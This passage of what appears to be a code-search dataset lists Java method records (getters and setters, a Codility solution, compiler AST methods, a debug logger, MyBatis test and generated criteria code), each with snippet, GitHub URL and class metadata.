"modifiers": ["public"], "return_type": "String", "snippet": "            public String getBalance() {                return balance;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "ContractBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setBalance", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void setBalance(String balance) {                this.balance = balance;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "ContractBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getAvailable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "            public String getAvailable() {                return available;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "ContractBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setAvailable", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void setAvailable(String available) {                this.available = available;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "ContractBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getEntrust", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "            public String getEntrust() {                return entrust;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "ContractBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setEntrust", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void setEntrust(String entrust) {                this.entrust = entrust;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "ContractBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getFreeze", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "            public String getFreeze() {                return freeze;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "ContractBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setFreeze", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void setFreeze(String freeze) {                this.freeze = freeze;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "ContractBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getHold", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "            public String getHold() {                return hold;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "ContractBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setHold", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void setHold(String hold) {                this.hold = hold;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "ContractBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getId", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "            public int getId() {                return id;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "PayMethodsBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setId", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void setId(int id) {                this.id = id;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "PayMethodsBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getAccount", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "            public String getAccount() {                return account;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "PayMethodsBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setAccount", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void setAccount(String account) {                this.account = account;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "PayMethodsBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getType", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "            public int getType() {                return type;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "PayMethodsBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setType", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void setType(int type) {                this.type = type;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "PayMethodsBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "getQr", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "            public String getQr() {                return qr;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "PayMethodsBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "setQr", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "            public void setQr(String qr) {                this.qr = qr;            }", "url": "https://raw.githubusercontent.com/niufuwei/block_chian/master/Stock/app/src/main/java/com/hjq/demo/http/response/AssetsBean.java", "stars": "1", "class": {"name": "PayMethodsBean", "extends": null, "implements": null, "modifiers": ["public", "static"]}}, {"method_name": "onScanFinished", "params": ["List<BleDevice>"], "throws": null, "modifiers": ["public", "abstract"], "return_type": "void", "snippet": "    public abstract void onScanFinished(List<BleDevice> scanResultList);    public void onLeScan(BleDevice bleDevice) {    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/callback/BleScanCallback.java", "stars": "2", "class": {"name": "BleScanCallback", "extends": null, "implements": ["BleScanPresenterImp"], "modifiers": ["public", "abstract"]}}, {"method_name": "onLeScan", "params": ["BleDevice"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void onLeScan(BleDevice bleDevice) {    }", "url": "https://raw.githubusercontent.com/wxw6860/BLEAPP/master/FastBleLib/src/main/java/com/clj/fastble/callback/BleScanCallback.java", "stars": "2", "class": {"name": "BleScanCallback", "extends": null, "implements": ["BleScanPresenterImp"], "modifiers": ["public", "abstract"]}}, {"method_name": "solution", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int solution(int[] a) {        // write your code in Java SE 8        \t\tint max = 0;        Set<Integer> positives = new HashSet<>();        for (int i = 0; i < a.length; i++) {            if (a[i] > 0) positives.add(a[i]);            if (a[i] > max) max = a[i];        }                if (max == 0) return 1;                boolean [] visits = new boolean[max + 1];                for (Integer num : positives) {            visits[num] = true;        }                for (int i = 1; i <= max; i++) {            if (visits[i] == false) return i;        }        return max + 1;    }", "url": "https://raw.githubusercontent.com/njcodernoob/codility-java-solutions/master/MissingInteger.java", "stars": "2", "class": {"name": "MissingInteger", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "checkType", "params": [], "throws": ["TypeException"], "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void checkType() throws TypeException {\t\tthis.getLeft().checkType();\t\tthis.getRight().checkType();\t\tgetLeft().getType().assertType(this, TypeCode.BOOLEAN);\t\tgetLeft().getType().assertType(this, getRight().getType());\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprOR.java", "stars": "3", "class": {"name": "ExprOR", "extends": "ExprBinary", "implements": null, "modifiers": ["public"]}}, {"method_name": "generateCode", "params": [], "throws": ["CodeException"], "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String generateCode() throws CodeException {\t\tString result;\t\tresult = \"(\" + getLeft().generateCode()\t\t\t\t+ \" || \" + getRight().generateCode() + \")\";\t\treturn result;\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprOR.java", "stars": "3", "class": {"name": "ExprOR", "extends": "ExprBinary", "implements": null, "modifiers": ["public"]}}, {"method_name": "constEval", "params": ["Environment<ExprVALUE>"], "throws": ["EnvironmentException", "TypeException"], "modifiers": ["public"], "return_type": "Object", "snippet": "\tpublic Object constEval(Environment<ExprVALUE> environment) throws EnvironmentException, TypeException {\t\tObject o1 = getLeft().constEval(environment);\t\tObject o2 = getRight().constEval(environment);\t\tif ((o1 instanceof Boolean) && (o2 instanceof Boolean)) \t\t\treturn new Boolean((Boolean)o1 || (Boolean)o2);\t\telse\t\t\tthrow new TypeException(\"Impossible de calculer la constante, erreur de type\", line, column);\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprOR.java", "stars": "3", "class": {"name": "ExprOR", "extends": "ExprBinary", "implements": null, "modifiers": ["public"]}}, {"method_name": "toString", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String toString() {\t\treturn \"(\" + this.getLeft() + \" || \" + this.getRight() + \")\";\t}", "url": "https://raw.githubusercontent.com/RhenaudTheLukark/Lea2C/master/src/fr/ubordeaux/deptinfo/compilation/lea/abstract_syntax/ExprOR.java", "stars": "3", "class": {"name": "ExprOR", "extends": "ExprBinary", "implements": null, "modifiers": ["public"]}}, {"method_name": "execute", "params": ["LibraryData"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void execute(LibraryData data) {        Objects.requireNonNull(data, LegalityCheck.LIBRARY_DATA_NULL_MESSAGE);        data.loadData(filePath);    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/src/AddCmd.java", "stars": "6", "class": {"name": "AddCmd", "extends": "LibraryCommand", "implements": null, "modifiers": ["public"]}}, {"method_name": "parseArguments", "params": ["String"], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "    protected boolean parseArguments(String argumentInput) {        // Meaningless check, just for probable tests        Objects.requireNonNull(argumentInput, LegalityCheck.INPUT_ARGUMENT_NULL_MESSAGE);        try {            // Check the file name extension            if (argumentInput.endsWith(FILE_NAME_EXTENSION)) {                filePath = Paths.get(argumentInput);                return true;            }            else {                return false;            }        } catch (Exception ex) {            return false;        }    }", "url": "https://raw.githubusercontent.com/LJacksonPan/Y1-OOP-CW3/master/src/AddCmd.java", "stars": "6", "class": {"name": "AddCmd", "extends": "LibraryCommand", "implements": null, "modifiers": ["public"]}}, {"method_name": "enable", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void enable() {        DEBUG_TAG = true;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/Debuger.java", "stars": "2", "class": {"name": "Debuger", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "disable", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void disable() {        DEBUG_TAG = false;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/Debuger.java", "stars": "2", "class": {"name": "Debuger", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getDebugMode", "params": [], "throws": null, "modifiers": ["public", "static"], "return_type": "boolean", "snippet": "    public static boolean getDebugMode() {        return DEBUG_TAG;    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/Debuger.java", "stars": "2", "class": {"name": "Debuger", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "printfLog", "params": ["String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void printfLog(String tag, String log) {        if (DEBUG_TAG && log != null) {            if (!TextUtils.isEmpty(log))                Log.i(tag, log);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/Debuger.java", "stars": "2", "class": {"name": "Debuger", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "printfLog", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void printfLog(String log) {        printfLog(LOG_TAG, log);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/Debuger.java", "stars": "2", "class": {"name": "Debuger", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "printfWarning", "params": ["String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void printfWarning(String tag, String log) {        if (DEBUG_TAG && log != null) {            if (!TextUtils.isEmpty(log))                Log.w(tag, log);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/Debuger.java", "stars": "2", "class": {"name": "Debuger", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "printfWarning", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void printfWarning(String log) {        printfWarning(LOG_TAG, log);    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/Debuger.java", "stars": "2", "class": {"name": "Debuger", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "printfError", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void printfError(String log) {        if (DEBUG_TAG) {            if (!TextUtils.isEmpty(log))                Log.e(LOG_TAG, log);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/Debuger.java", "stars": "2", "class": {"name": "Debuger", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "printfError", "params": ["String", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void printfError(String Tag, String log) {        if (DEBUG_TAG) {            if (!TextUtils.isEmpty(log))                Log.e(Tag, log);        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/Debuger.java", "stars": "2", "class": {"name": "Debuger", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "printfError", "params": ["String", "Exception"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void printfError(String log, Exception e) {        if (DEBUG_TAG) {            if (!TextUtils.isEmpty(log))                Log.e(LOG_TAG, log);            e.printStackTrace();        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/Debuger.java", "stars": "2", "class": {"name": "Debuger", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "Toast", "params": ["Activity", "String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void Toast(Activity activity, String log) {        if (DEBUG_TAG) {            if (!TextUtils.isEmpty(log))                Toast.makeText(activity, log, Toast.LENGTH_SHORT).show();        }    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-java/src/main/java/com/shuyu/gsyvideoplayer/utils/Debuger.java", "stars": "2", "class": {"name": "Debuger", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setUp", "params": [], "throws": ["Exception"], "modifiers": ["static"], "return_type": "void", "snippet": "  static void setUp() throws Exception {    // create a SqlSessionFactory    try (Reader reader = Resources.getResourceAsReader(\"org/apache/ibatis/submitted/extendresultmap/mybatis-config.xml\")) {      sqlSessionFactory = new SqlSessionFactoryBuilder().build(reader);    }    // populate in-memory database    BaseDataTest.runScript(sqlSessionFactory.getConfiguration().getEnvironment().getDataSource(),            \"org/apache/ibatis/submitted/extendresultmap/CreateDB.sql\");  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/extendresultmap/ExtendResultMapTest.java", "stars": "15", "class": {"name": "ExtendResultMapTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "shouldGetAUser", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "  void shouldGetAUser() {    try (SqlSession sqlSession = sqlSessionFactory.openSession()) {      TestMapperY mapper = sqlSession.getMapper(TestMapperY.class);      mapper.retrieveTestString();    }  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/test/java/org/apache/ibatis/submitted/extendresultmap/ExtendResultMapTest.java", "stars": "15", "class": {"name": "ExtendResultMapTest", "extends": null, "implements": null, "modifiers": []}}, {"method_name": "setOrderByClause", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setOrderByClause(String orderByClause) {        this.orderByClause = orderByClause;    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "UmsRoleExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getOrderByClause", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "    public String getOrderByClause() {        return orderByClause;    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "UmsRoleExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "setDistinct", "params": ["boolean"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void setDistinct(boolean distinct) {        this.distinct = distinct;    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "UmsRoleExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isDistinct", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isDistinct() {        return distinct;    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "UmsRoleExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "getOredCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Criteria>", "snippet": "    public List<Criteria> getOredCriteria() {        return oredCriteria;    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "UmsRoleExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "or", "params": ["Criteria"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void or(Criteria criteria) {        oredCriteria.add(criteria);    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "UmsRoleExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "or", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "    public Criteria or() {        Criteria criteria = createCriteriaInternal();        oredCriteria.add(criteria);        return criteria;    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "UmsRoleExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "createCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "    public Criteria createCriteria() {        Criteria criteria = createCriteriaInternal();        if (oredCriteria.size() == 0) {            oredCriteria.add(criteria);        }        return criteria;    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "UmsRoleExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "createCriteriaInternal", "params": [], "throws": null, "modifiers": ["protected"], "return_type": "Criteria", "snippet": "    protected Criteria createCriteriaInternal() {        Criteria criteria = new Criteria();        return criteria;    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "UmsRoleExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "clear", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void clear() {        oredCriteria.clear();        orderByClause = null;        distinct = false;    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "UmsRoleExample", "extends": null, "implements": null, "modifiers": ["public"]}}, {"method_name": "isValid", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "        public boolean isValid() {            return criteria.size() > 0;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "getAllCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Criterion>", "snippet": "        public List<Criterion> getAllCriteria() {            return criteria;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "getCriteria", "params": [], "throws": null, "modifiers": ["public"], "return_type": "List<Criterion>", "snippet": "        public List<Criterion> getCriteria() {            return criteria;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "addCriterion", "params": ["String"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void addCriterion(String condition) {            if (condition == null) {                throw new RuntimeException(\"Value for condition cannot be null\");            }            criteria.add(new Criterion(condition));        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "addCriterion", "params": ["String", "Object", "String"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void addCriterion(String condition, Object value, String property) {            if (value == null) {                throw new RuntimeException(\"Value for \" + property + \" cannot be null\");            }            criteria.add(new Criterion(condition, value));        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "addCriterion", "params": ["String", "Object", "Object", "String"], "throws": null, "modifiers": ["protected"], "return_type": "void", "snippet": "        protected void addCriterion(String condition, Object value1, Object value2, String property) {            if (value1 == null || value2 == null) {                throw new RuntimeException(\"Between values for \" + property + \" cannot be null\");            }            criteria.add(new Criterion(condition, value1, value2));        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdIsNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdIsNull() {            addCriterion(\"id is null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdIsNotNull", "params": [], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdIsNotNull() {            addCriterion(\"id is not null\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdEqualTo", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdEqualTo(Long value) {            addCriterion(\"id =\", value, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdNotEqualTo", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdNotEqualTo(Long value) {            addCriterion(\"id <>\", value, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdGreaterThan", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdGreaterThan(Long value) {            addCriterion(\"id >\", value, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdGreaterThanOrEqualTo", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdGreaterThanOrEqualTo(Long value) {            addCriterion(\"id >=\", value, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdLessThan", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdLessThan(Long value) {            addCriterion(\"id <\", value, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdLessThanOrEqualTo", "params": ["Long"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdLessThanOrEqualTo(Long value) {            addCriterion(\"id <=\", value, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdIn", "params": ["List<Long>"], "throws": null, "modifiers": ["public"], "return_type": "Criteria", "snippet": "        public Criteria andIdIn(List<Long> values) {            addCriterion(\"id in\", values, \"id\");            return (Criteria) this;        }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/swagger/src/main/java/com/macro/mall/tiny/mbg/model/UmsRoleExample.java", "stars": "2", "class": {"name": "GeneratedCriteria", "extends": null, "implements": null, "modifiers": ["abstract", "static", "protected"]}}, {"method_name": "andIdNotIn", "params": ["List<Long>"], "throws": null, "modifiers": ["public"], "return_type": 